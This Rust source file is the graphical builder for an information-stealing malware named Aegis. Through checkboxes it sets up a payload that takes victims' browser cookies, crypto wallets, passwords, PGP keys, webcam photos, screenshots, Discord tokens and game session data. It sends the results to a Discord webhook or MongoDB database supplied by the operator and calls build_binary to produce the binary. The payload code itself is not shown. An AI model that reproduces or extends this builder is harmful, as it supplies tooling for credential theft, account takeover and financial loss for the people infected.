use aegis::build_binary;

use iced::{
    Element, Theme, application,
    widget::{button, checkbox, column, container, row, text, text_input},
};

#[derive(Default, Debug, Clone)]
struct App {
    webhook_uri: String,
    browser_cookies: bool,
    crypto_wallets: bool,
    txt_files: bool,
    passwords: bool,
    pgp_keys: bool,
    webcam_photo: bool,
    screenshot_desktop: bool,
    discord_token: bool,
    minecraft_ssid: bool,
    growtopia_save_dat: bool,

    mongodb: bool,
    mongodb_uri: String,
}

#[derive(Debug, Clone)]
enum Message {
    ChangeWebhookUri(String),
    ToggleBrowserCookies(bool),
    ToggleCryptoWallets(bool),
    ToggleTxtFiles(bool),
    TogglePasswords(bool),
    TogglePgpKeys(bool),
    ToggleWebcamPhoto(bool),
    ToggleScreenshotDesktop(bool),
    ToggleDiscordToken(bool),
    ToggleMinecraftSsid(bool),
    ToggleGrowtopiaSaveDat(bool),
    ToggleMongoDB(bool),
    ChangeMongoDBUri(String),
    //SendMongo,
    //SendWebhook,
    Build,
}

impl App {
    fn update(&mut self, message: Message) {
        match message {
            Message::ChangeWebhookUri(uri) => {
                self.webhook_uri = uri;
            }
            Message::ToggleBrowserCookies(toggle) => {
                self.browser_cookies = toggle;
            }
            Message::ToggleCryptoWallets(toggle) => {
                self.crypto_wallets = toggle;
            }
            Message::ToggleTxtFiles(toggle) => {
                self.txt_files = toggle;
            }
            Message::TogglePasswords(toggle) => {
                self.passwords = toggle;
            }
            Message::TogglePgpKeys(toggle) => {
                self.pgp_keys = toggle;
            }
            Message::ToggleWebcamPhoto(toggle) => {
                self.webcam_photo = toggle;
            }
            Message::ToggleScreenshotDesktop(toggle) => {
                self.screenshot_desktop = toggle;
            }
            Message::ToggleDiscordToken(toggle) => {
                self.discord_token = toggle;
            }
            Message::ToggleMinecraftSsid(toggle) => {
                self.minecraft_ssid = toggle;
            }
            Message::ToggleGrowtopiaSaveDat(toggle) => {
                self.growtopia_save_dat = toggle;
            }
            Message::ToggleMongoDB(toggle) => {
                self.mongodb = toggle;
            }
            Message::ChangeMongoDBUri(uri) => {
                self.mongodb_uri = uri;
            }
            Message::Build => {
                build_binary(
                    self.screenshot_desktop,
                    self.browser_cookies,
                    self.txt_files,
                    self.discord_token,
                    self.webhook_uri.clone(),
                );
            }
        }
    }

    fn view(&self) -> Element<Message> {
        let row = row![
            column![
                checkbox(self.browser_cookies)
                    .label("Browser Cookies")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleBrowserCookies),
                checkbox(self.crypto_wallets)
                    .label("Crypto Wallets")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleCryptoWallets),
                checkbox(self.txt_files)
                    .label("Txt Files")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleTxtFiles),
                checkbox(self.passwords)
                    .label("Passwords")
                    .text_size(12.0)
                    .on_toggle(Message::TogglePasswords),
                checkbox(self.mongodb)
                    .label("MongoDB")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleMongoDB),
                if self.mongodb {
                    text_input("MongoDB URI", self.mongodb_uri.as_str())
                        .on_input(Message::ChangeMongoDBUri)
                        .width(170.0)
                        .size(12.0)
                        .into()
                } else {
                    let e: Element<'_, Message> =
                        text("MongoDB URI is not enabled").size(12.0).into();
                    e
                },
            ]
            .spacing(10.0),
            column![
                checkbox(self.pgp_keys)
                    .label("Pgp Keys")
                    .text_size(12.0)
                    .on_toggle(Message::TogglePgpKeys),
                checkbox(self.webcam_photo)
                    .label("Webcam Photo")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleWebcamPhoto),
                checkbox(self.screenshot_desktop)
                    .label("Screenshot Desktop")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleScreenshotDesktop),
                checkbox(self.discord_token)
                    .label("Discord Token")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleDiscordToken),
            ]
            .spacing(10.0),
            column![
                checkbox(self.minecraft_ssid)
                    .label("Minecraft Ssid")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleMinecraftSsid),
                checkbox(self.growtopia_save_dat)
                    .label("Growtopia Save Dat")
                    .text_size(12.0)
                    .on_toggle(Message::ToggleGrowtopiaSaveDat),
                text_input("Discord Webhook URL", &self.webhook_uri)
                    .on_input(Message::ChangeWebhookUri)
                    .width(200.0)
                    .size(12.0),
                button("Build Aegis").on_press(Message::Build),
            ]
            .spacing(10.0),
        ]
        .padding(20.0)
        .spacing(10.0);

        container(row).into()
    }
}

fn main() -> iced::Result {
    application(|| App::default(), App::update, App::view)
        .window_size((500.0, 300.0))
        .theme(|app: &App| Theme::Oxocarbon)
        .run()
}
